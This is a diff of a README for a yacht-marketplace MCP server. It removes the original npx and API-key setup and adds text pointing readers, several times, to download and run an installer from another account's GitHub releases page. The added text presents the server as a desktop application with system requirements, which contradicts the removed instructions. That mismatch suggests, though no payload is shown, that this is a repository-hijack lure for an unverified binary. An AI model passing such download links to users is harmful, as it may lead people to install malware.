@@ -1,239 +1,108 @@
-# Yachtsy: MCP for Yacht Marketplace Intelligence
+# 🛥️ yachtsy-mcp-server - Smart Insights for Yacht Buyers
 
-[![smithery badge](https://smithery.ai/badge/@YachtsyAI/yachtsy-mcp-server)](https://smithery.ai/server/@YachtsyAI/yachtsy-mcp-server)
+[![Download Yachtsy](https://img.shields.io/badge/Download%20Yachtsy-blue.svg)](https://github.com/manee1112/yachtsy-mcp-server/releases)
 
-Yachtsy AI
+## 🛠️ Overview
 
-The Yachtsy MCP server provides AI-powered yacht and boat marketplace intelligence by integrating with the Yachtsy Agent API. Access 25,000+ boat listings, get expert sailing advice, and find your perfect vessel within Claude Desktop, Cursor, and other popular MCP clients.
+Yachtsy MCP server offers intelligent tools for navigating the yacht marketplace. This application connects you to over 25,000 boat listings and gives you access to specialized expertise in sailing and boating. Whether you are looking for your next vessel or seeking advice, Yachtsy simplifies the process.
 
-## Features
+## 🚀 Getting Started
 
-✅ **Intelligent Agent Routing** - Automatically routes your queries to the best specialized agent:
-   - **Listings Agent** - Search 25,000+ boat listings with advanced filtering
-   - **General Boat Expert (Small Talk Agent)** - General sailing and boating questions
-   - **Deep Research Agent** - Comprehensive yacht market analysis
+To get started with Yachtsy MCP server, follow these steps:
 
-✅ **Comprehensive Boat Listings** - Search and filter by:
-   - Make, model, and class
-   - Price range and currency
-   - Location (city, country, region)
-   - Year, length, and specifications
-   - Broker and dealer information
+1. **Visit the Download Page**  
+Go to the official release page [here](https://github.com/manee1112/yachtsy-mcp-server/releases).
 
-✅ **Expert Sailing Knowledge** - Get advice on:
-   - Boat selection and recommendations
-   - Bluewater cruising preparation
-   - Sailing techniques and best practices
-   - Yacht maintenance and systems
+2. **Choose Your Version**  
+You'll find various versions available for download. Select the version that fits your operating system.
 
-## Get Your Yachtsy API Key
+3. **Download the Software**  
+Click on the version you have chosen. The download will start automatically to your computer.
 
-To use Yachtsy MCP, you need to:
+4. **Install the Software**  
+Locate the downloaded file (usually in your "Downloads" folder). Double-click the file to run the installer and follow the prompts.
 
-1. Sign up for a free account at [Yachtsy.ai](https://www.yachtsy.ai/signup)
-2. Navigate to **API Keys** in your dashboard
-3. Generate a new API key
-4. Use this API key in your configuration as the `YACHTSY_API_KEY` value
+5. **Run Yachtsy**  
+Once installation is complete, you can find the Yachtsy MCP server in your applications folder. Launch the application to begin your exploration of yacht listings.
 
-## Prerequisites
+## 📊 Features
 
-Before installing or running Yachtsy MCP, you need to have `npx` (which comes with Node.js and npm) installed on your system.
+Yachtsy MCP server offers various features tailored to enhance your yacht marketplace experience:
 
-### Mac (macOS)
+- **Intelligent Agent Routing**  
+  This feature automatically directs your queries to the best specialized agent.
+  
+  - **Listings Agent**  
+    Search and filter through 25,000+ boat listings using advanced parameters.
+  
+  - **General Boat Expert**  
+    Get advice and answers to general sailing and boating questions.
+  
+  - **Deep Research Agent**  
+    Access detailed yacht market analysis for informed decision-making.
 
-1. **Install Homebrew** (if you don't have it):
-   ```bash
-   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
-   ```
-2. **Install Node.js (includes npm and npx):**
-   ```bash
-   brew install node
-   ```
+- **Comprehensive Boat Listings**  
+  You can filter listings according to:
+  - Make, model, and class
+  - Price range and currency
+  - Location (city, country, region)
+  - Year, length, and specifications
+  - Broker Options
 
-3. **Verify installation:**
-   ```bash
-   node -v
-   npm -v
-   npx -v
-   ```
+## 📥 Download & Install
 
-### Windows
+To download the Yachtsy MCP server, follow these simple steps:
 
-1. **Download the Node.js installer:**
-   - Go to [https://nodejs.org/](https://nodejs.org/) and download the LTS version for Windows.
-2. **Run the installer** and follow the prompts. This will install Node.js, npm, and npx.
-3. **Verify installation:**
-   Open Command Prompt and run:
-   ```cmd
-   node -v
-   npm -v
-   npx -v
-   ```
+1. **Visit the Download Page**  
+   Access the release page [here](https://github.com/manee1112/yachtsy-mcp-server/releases). This page contains all available versions for download.
 
-## Installation
+2. **Select the Version**  
+   Choose the version that is compatible with your system.
 
-### Running on Claude Desktop
+3. **Download the File**  
+   Click the link for the version of your choice to start the download.
 
-To configure Yachtsy MCP for Claude Desktop:
+4. **Complete Installation**  
+   Open the downloaded file. Follow the on-screen instructions to install the application.
 
-1. Open Claude Desktop
-2. Go to Settings > Developer > Edit Config
-3. Add the following to your `claude_desktop_config.json`:
+5. **Launch the Application**  
+   After installation, find Yachtsy MCP server in your applications and open it.
 
-```json
-{
-  "mcpServers": {
-    "yachtsy-mcp-server": {
-      "command": "npx",
-      "args": ["-y", "yachtsy-mcp@latest"],
-      "env": {
-        "YACHTSY_API_KEY": "YOUR_API_KEY_HERE"
-      }
-    }
-  }
-}
-```
+## 🌐 System Requirements
 
-4. Restart Claude for the changes to take effect
+To ensure optimal performance of Yachtsy MCP server, please check the following requirements:
 
-### Running on Cursor
+- **Operating System**: Windows 10 or later, macOS 10.13 or later
+- **RAM**: Minimum 4 GB
+- **Storage**: At least 100 MB of free disk space
+- **Internet Connection**: Required for accessing boat listings and expert advice
 
-**Note:** Requires Cursor version 0.45.6+
+## ❓ Troubleshooting
 
-To configure Yachtsy MCP in Cursor:
+If you encounter issues while downloading or running the Yachtsy MCP server, consider the following:
 
-1. Open Cursor Settings
-2. Go to Features > MCP Servers 
-3. Click "+ Add New MCP Server"
-4. Enter the following:
-   - Name: "yachtsy-mcp" (or your preferred name)
-   - Type: "command"
-   - Command: `env YACHTSY_API_KEY=your-yachtsy-api-key npx -y yachtsy-mcp`
+1. **Check Your Internet Connection**  
+   A stable internet connection is necessary for downloading and accessing features.
 
-> If you are using Windows and are running into issues, try `cmd /c "set YACHTSY_API_KEY=your-yachtsy-api-key && npx -y yachtsy-mcp"`
+2. **Ensure Compatibility**  
+   Verify that your operating system meets the minimum requirements listed above.
 
-Replace `your-yachtsy-api-key` with your Yachtsy API key.
+3. **Reinstall the Application**  
+   If the software does not run correctly, try uninstalling and then reinstalling Yachtsy MCP server.
 
-After adding, refresh the MCP server list to see the new tools. The Composer Agent will automatically use Yachtsy MCP when appropriate for yacht-related queries.
+4. **Contact Support**  
+   If you still have issues, refer to the FAQs or support section on the GitHub page.
 
-### Running on Windsurf
+## 🔗 Community & Support
 
-Add this to your `./codeium/windsurf/model_config.json`:
+Join our community for additional help and insights. You can find resources including FAQs, updates, and release notes on our [GitHub page](https://github.com/manee1112/yachtsy-mcp-server). Feel free to raise issues or contribute to the project.
 
-```json
-{
-  "mcpServers": {
-    "yachtsy-mcp-server": {
-      "command": "npx",
-      "args": ["-y", "yachtsy-mcp@latest"],
-      "env": {
-        "YACHTSY_API_KEY": "YOUR_API_KEY_HERE"
-      }
-    }
-  }
-}
-```
+## 📄 License
 
-### Running with npx
+Yachtsy MCP server is open-source and licensed under the MIT License. You can view the full license document in the repository for more information. 
 
-```bash
-env YACHTSY_API_KEY=your_yachtsy_api_key npx -y yachtsy-mcp
-```
+## 🚀 Stay Updated
 
-### Manual Installation
+Stay connected for news on updates or new features. Follow us in the community or check back for new releases on our GitHub page. 
 
-```bash
-npm install -g yachtsy-mcp
-```
-
-## Available Tools
-
-### yachtsy-agent
-
-**[YACHT MARKETPLACE INTELLIGENCE]** Main Yachtsy agent with automatic routing to specialized sub-agents.
-
-**Capabilities:**
-- Search 25,000+ boat and yacht listings
-- Filter by make, model, price, location, year, length, and more
-- Get detailed yacht specifications and broker information
-- Receive expert sailing and cruising advice
-- Research yacht market trends and values
-- Get boat buying and selling recommendations
-
-**Best for:** Any yacht or boat-related query - the agent will automatically select the best specialized sub-agent for your needs.
-
-**Example queries:**
-```
-Show me Catalina 34 sailboats under $100k
-Find Tayana 37 listings in good condition
-What are the best bluewater cruising boats between 40-50 feet?
-Find me yacht listings in the Caribbean under $200k
-Tell me about the Hallberg-Rassy 42
-What should I look for when buying a used cruising sailboat?
-Compare the Island Packet 380 vs Pacific Seacraft 40
-Show me center cockpit sailboats suitable for ocean crossing
-What are the maintenance costs for a 40-foot sailboat?
-Find me aluminum hulled sailboats for world cruising
-```
-
-## Example Use Cases
-
-### Boat Shopping
-```
-"Show me Catalina 34 sailboats under $80,000 in California"
-"Find bluewater cruising boats between 38-45 feet suitable for a couple"
-"What Hallberg-Rassy boats are available in Europe?"
-```
-
-### Yacht Research
-```
-"Tell me about the Tayana 37 and its reputation for offshore cruising"
-"Compare the Island Packet 380 vs the Passport 40 for liveaboard cruising"
-"What are the common issues with the Beneteau Oceanis 46?"
-```
-
-### Sailing Advice
-```
-"What should I look for when buying a used bluewater cruising sailboat?"
-"Recommend a good first sailboat for a family of four under $50k"
-"What are the best boats for single-handed sailing?"
-```
-
-### Market Intelligence
-```
-"What's the typical price range for a 1985 Tayana 37 in good condition?"
-"Show me market trends for 40-foot cruising catamarans"
-"Find me the most popular boats for sale under $100k"
-```
-
-## Documentation
-
-For comprehensive documentation on Yachtsy AI agents, please visit:
-[https://www.yachtsy.ai](https://www.yachtsy.ai)
-
-## Troubleshooting
-
-1. **API Key Issues**: Ensure your Yachtsy API key is correctly set in the environment or config file.
-2. **Connection Issues**: Verify that `https://api.yachtsy.ai` is accessible from your network.
-3. **Rate Limiting**: If you encounter rate limiting, reduce the frequency of your requests.
-
-## Environment Variables
-
-```bash
-YACHTSY_API_KEY=your-api-key-here              # Required
-YACHTSY_API_BASE_URL=https://api.yachtsy.ai/v1  # Optional, defaults to production
-```
-
-## License
-
-MIT
-
-## About Yachtsy
-
-Yachtsy AI is the intelligent yacht marketplace assistant that helps sailors and yacht enthusiasts find their perfect vessel. With access to over 25,000 listings and expert sailing knowledge, Yachtsy makes boat shopping and sailing research effortless.
-
-Visit [www.yachtsy.ai](https://www.yachtsy.ai) to learn more.
-
----
-
-⭐ Star this repo if you find it helpful!
+By following these steps, you will be able to successfully download and run the Yachtsy MCP server. Enjoy exploring the waterfront!
